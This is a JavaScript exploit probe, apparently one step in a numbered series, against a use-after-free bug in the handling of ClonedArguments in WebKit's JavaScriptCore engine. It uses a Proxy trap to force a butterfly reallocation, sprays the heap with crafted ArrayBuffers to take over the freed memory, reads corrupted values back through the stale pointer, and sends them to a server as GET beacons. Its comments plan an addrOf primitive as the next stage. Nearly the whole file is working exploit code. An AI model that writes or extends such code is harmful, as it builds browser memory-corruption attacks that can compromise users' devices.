// p221 — ClonedArguments butterfly UAF: extract corrupted values
//
// p220 CONFIRMED: UAF-CORRUPT-1 (Phase 4), ALT-DEAD-4 (Phase 5)
// But POST body data was lost (server doesn't log bodies over TLS).
//
// This probe uses SYNC GET beacons with data in the URL to capture
// the actual corrupted values from the stale butterfly pointer.
//
// Beacon prefix: V221-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V221-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // ---- TEST A: 64-arg UAF with multiple holes, GET-encoded values ----
  var reallocCount = 0;
  var altSpray = [];

  try {
    var manyArgs = [];
    for (var a = 0; a < 64; a++) manyArgs.push(a + 1);

    var args = target.apply(null, manyArgs);
    // Create holes at known positions
    delete args[5];
    delete args[10];
    delete args[15];
    delete args[20];
    delete args[25];
    delete args[30];
    BS('A-HOLES-6');

    var trap = {
      get: function(target, prop, receiver) {
        reallocCount++;
        if (reallocCount === 1) {
          BS('A-TRAP-' + prop);

          // Grow to force butterfly reallocation
          for (var j = 100; j < 800; j++) {
            args[j] = 0x41414141;
          }
          BS('A-GREW');

          // Flush bmalloc dealloc log
          var junk = [];
          for (var f = 0; f < 200; f++) junk.push(new ArrayBuffer(64));
          junk = null;

          // Old butterfly: IndexingHeader(8) + 64*8 = 520 bytes
          // Spray matching size buffers with controlled pattern
          for (var s = 0; s < 4000; s++) {
            var ab = new ArrayBuffer(528);
            var v = new Uint32Array(ab);
            // Fill with recognizable pattern:
            // Each 8-byte slot: low32 = 0xCAFE0000 | slot_index, high32 = spray_id
            for (var k = 0; k < v.length; k += 2) {
              v[k] = 0xCAFE0000 | (k >> 1);       // low 32: marker + slot index
              v[k + 1] = (s & 0xFFFF);             // high 32: spray buffer id
            }
            altSpray.push(ab);
          }
          BS('A-SPRAYED-' + altSpray.length);
        }
        return 0xFACE0000 | (reallocCount & 0xFFFF);
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));
    BS('A-PROTO-SET');

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      BS('A-ERR-' + e.message.substring(0, 30));
      result = null;
    }

    if (result) {
      BS('A-LEN-' + result.length);

      // Report ALL values as GET beacons
      var deadCount = 0;
      for (var r = 0; r < Math.min(result.length, 64); r++) {
        var v = result[r];
        var tag;
        if (typeof v === 'number') {
          var u = v >>> 0;
          var isOrig = (v === (r + 1));
          var isMarker = ((u >>> 16) === 0xCAFE || (u >>> 16) === 0xFACE);
          if (isMarker) {
            deadCount++;
            tag = 'V' + r + '=M' + hex(u);
          } else if (!isOrig && v !== undefined) {
            deadCount++;
            // For non-integer or large values, report both uint32 halves
            // JavaScript numbers are float64, so we need both halves
            var f64 = new Float64Array(1);
            f64[0] = v;
            var u32 = new Uint32Array(f64.buffer);
            tag = 'V' + r + '=X' + hex(u32[1]) + hex(u32[0]);
          } else {
            tag = 'V' + r + '=' + hex(u);
          }
        } else if (typeof v === 'object' && v !== null) {
          deadCount++;
          tag = 'V' + r + '=OBJ';
        } else if (v === undefined) {
          tag = 'V' + r + '=undef';
        } else {
          tag = 'V' + r + '=T' + typeof v;
        }
        // Only beacon non-trivial values to save bandwidth
        // Original values (1-64) and undefined are expected
        var isExpected = (typeof v === 'number' && v === (r + 1));
        var isHole = (v === undefined && (r === 5 || r === 10 || r === 15 || r === 20 || r === 25 || r === 30));
        var isProxyRet = (typeof v === 'number' && ((v >>> 0) >>> 16) === 0xFACE);
        if (!isExpected && !isHole && !isProxyRet) {
          BS(tag);
        }
      }
      BS('A-DEAD-' + deadCount);

      // Also report values around hole positions specifically
      // These are the most likely to show stale reads
      var holeAdj = [4,5,6, 9,10,11, 14,15,16, 19,20,21, 24,25,26, 29,30,31];
      for (var h = 0; h < holeAdj.length; h++) {
        var idx = holeAdj[h];
        if (idx < result.length) {
          var val = result[idx];
          var f64b = new Float64Array(1);
          f64b[0] = (typeof val === 'number') ? val : 0;
          var u32b = new Uint32Array(f64b.buffer);
          BS('H' + idx + '=' + hex(u32b[1]) + '_' + hex(u32b[0]) + '_T' + typeof val);
        }
      }
    }
  } catch (e) {
    BS('A-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: Focused UAF with JSValue-encoded spray ----
  // Spray int32 JSValues: 0xFFFE0000_DEADBEEF
  // If the stale pointer reads this, JS sees it as integer 0xDEADBEEF
  try {
    BS('B-START');
    reallocCount = 0;
    var bSpray = [];

    var bArgs = [];
    for (var a = 0; a < 64; a++) bArgs.push(a + 1);
    var args2 = target.apply(null, bArgs);
    delete args2[3];
    delete args2[7];
    delete args2[11];

    var trap2 = {
      get: function(target, prop) {
        reallocCount++;
        if (reallocCount === 1) {
          BS('B-TRAP-' + prop);
          for (var j = 100; j < 800; j++) args2[j] = 0x41;
          BS('B-GREW');

          var junk = [];
          for (var f = 0; f < 200; f++) junk.push(new ArrayBuffer(64));
          junk = null;

          // Spray with JSValue int32 encoding: 0xFFFE0000_DEADBEEF
          // On 64-bit JSC, Int32 tag is 0xFFFE0000 in high 32 bits
          for (var s = 0; s < 4000; s++) {
            var ab = new ArrayBuffer(528);
            var v = new Uint32Array(ab);
            for (var k = 0; k < v.length; k += 2) {
              v[k] = 0xDEAD0000 | (k >> 1);  // payload: 0xDEAD00XX
              v[k + 1] = 0xFFFE0000;          // Int32 tag
            }
            bSpray.push(ab);
          }
          BS('B-SPRAYED-' + bSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, trap2));

    var result2;
    try {
      result2 = receiver.apply(null, args2);
    } catch (e) {
      BS('B-ERR-' + e.message.substring(0, 30));
      result2 = null;
    }

    if (result2) {
      BS('B-LEN-' + result2.length);
      var bDead = 0;
      for (var r = 0; r < Math.min(result2.length, 64); r++) {
        var val = result2[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xDEAD) {
            bDead++;
            BS('B-HIT-' + r + '=' + hex(u));
          }
        }
      }
      BS('B-DEAD-' + bDead);
      if (bDead > 0) BS('B-CONTROLLED-READ-CONFIRMED');
    }
  } catch (e) {
    BS('B-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST C: addrOf primitive proof-of-concept ----
  // If we can control what the stale pointer reads as a JSValue,
  // we can make it read a JSValue that IS an object pointer.
  // Step 1: Spray with pointer-tagged JSValues pointing to a known object
  // Step 2: The stale read returns the object → we have its address
  //
  // But first we need to confirm controlled reads work (Test B).
  // If B works, deploy addrOf in p222.

  BS('DONE');
})();
